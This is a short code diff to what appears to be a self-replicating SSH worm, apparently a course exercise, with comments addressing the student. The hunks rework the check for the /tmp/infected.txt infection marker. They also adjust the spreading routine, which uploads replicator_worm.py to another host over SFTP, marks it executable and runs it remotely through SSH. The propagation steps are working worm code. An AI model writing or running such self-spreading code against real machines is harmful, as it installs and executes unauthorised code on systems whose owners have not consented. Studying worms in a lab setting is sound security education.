@@ -28,15 +28,16 @@ def isInfectedSystem():
 	# approach is to check for a file called
 	# infected.txt in directory /tmp (which
 	# you created when you marked the system
-	# as infected). 
-	try:
-		print("checking for infected.txt")
-		f=open("/tmp/infected.txt", "r")
-		f.close()
-		return True
-	except IOError:
-		print ("system not yet infected")
-		return False
+	# as infected).
+	return os.path.exists("/tmp/infected.txt") 
+	#try:
+	#	print("checking for infected.txt")
+	#	f=open("/tmp/infected.txt", "r")
+	#	f.close()
+	#	return True
+	#except IOError:
+	#	print ("system not yet infected")
+	#	return False
 	
 
 #################################################################
@@ -76,9 +77,9 @@ def spreadAndExecute(sshClient):
 	
 	print("****************inside the spreadAndExecute***********")
 	# MIG: Changed this one to the SFTP client
-	sftpClient.put("replicator_worm.py","/tmp/replicator_worm.py")
+	sftpClient.put("/tmp/replicator_worm.py","/tmp/replicator_worm.py")
 	sshClient.exec_command("chmod a+x /tmp/replicator_worm.py")
-	sshClient.exec_command("python /tmp/replicator_worm.py")
+	sshClient.exec_command("python /tmp/replicator_worm.py 2> /tmp/log.txt")
 	
 
 ############################################################
